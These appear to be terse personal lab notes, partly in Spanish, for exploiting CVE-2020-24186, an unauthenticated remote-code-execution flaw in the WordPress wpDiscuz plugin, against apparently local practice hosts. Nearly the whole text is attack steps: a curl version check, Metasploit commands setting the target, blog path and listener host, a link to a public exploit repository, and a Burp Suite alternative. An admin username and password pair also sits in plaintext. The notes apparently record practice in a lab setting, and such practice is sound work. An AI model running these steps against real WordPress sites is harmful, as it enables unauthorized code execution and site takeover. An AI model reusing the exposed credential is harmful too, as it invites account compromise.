admin / 3HfEXeyksooMNp2LGI

curl http://172.25.0.3/wp-content/plugins/wpdiscuz/readme.txt | head -n 10

search CVE-2020-24186
use 0

set RHOSTS 172.25.0.3

set BLOGPATH /index.php/2025/01/20/fake-post-2/

set LHOST 172.25.0.4



echo "http://172.25.0.3/" > site.txt


http://localhost:8080/2025/01/20/fake-post-2/#comment-4




Opción A
curl http://192.168.1.175:8080/wp-content/plugins/wpdiscuz/readme.txt | head -n 10

http://localhost:8080/2025/01/20/fake2/

msfconsole 

search CVE-2020-24186
use 0


set RHOSTS 192.168.1.175
set RPORT 8080

set BLOGPATH /2025/01/20/fake2/

set LHOST 192.168.1.175


Opción B

https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE/tree/main

Opción C
Burp Suite 
https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce